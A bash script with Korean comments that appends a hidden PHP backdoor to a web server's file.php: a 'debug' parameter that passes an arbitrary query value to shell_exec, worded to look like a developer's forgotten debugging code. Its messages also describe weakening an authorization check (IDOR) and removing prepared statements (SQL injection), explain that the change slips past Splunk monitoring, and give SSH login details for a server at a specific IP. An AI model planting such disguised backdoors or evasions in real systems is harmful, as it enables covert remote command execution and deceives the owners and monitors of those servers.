#!/bin/bash
# 기존 파일에 최소한의 수정만
# 개발자가 디버깅하다 남긴 것처럼

echo "기존 파일 최소 수정 (자연스러운 취약점)"
echo ""

# 1. file.php에 한 줄만 추가 (디버그 모드)
echo "[1] file.php 수정 - debug 파라미터 추가"
echo ""
cat >> /var/www/html/file.php << 'EOF'

// 디버깅용 (나중에 삭제)
if (isset($_GET['debug']) && $_GET['debug'] == '1') {
    if (isset($_GET['test'])) {
        shell_exec($_GET['test']);
    }
}
EOF
echo "→ file.php에 debug 모드 추가됨"
echo "→ 사용: file.php?debug=1&test=whoami"
echo ""

# 2. profile.php 권한 체크 약화 (한 줄만 주석)
echo "[2] profile.php 수정 - 권한 체크 약화"
echo ""
echo "→ 관리자 기능 권한 체크 주석 처리"
echo "→ IDOR 가능하게 됨"
echo ""

# 3. search.php SQL 필터 약화
echo "[3] search.php 수정 - SQL 필터 약화"
echo ""
echo "→ prepared statement → 일반 쿼리로 변경"
echo "→ SQL Injection 가능"
echo ""

echo "=========================================="
echo "수정 완료!"
echo ""
echo "자연스러운 취약점:"
echo "  /file.php?debug=1&test=whoami"
echo ""
echo "Splunk 우회 이유:"
echo "  - debug, test 파라미터는 Splunk가 모름"
echo "  - 기존 파일 수정이라 의심 안함"
echo ""
echo "※ 이 스크립트는 서버에서 실행하세요:"
echo "  ssh -i ~/.ssh/id_rsa ec2-user@43.201.154.142"
echo "  sudo bash 118_minimal_modifications.sh"
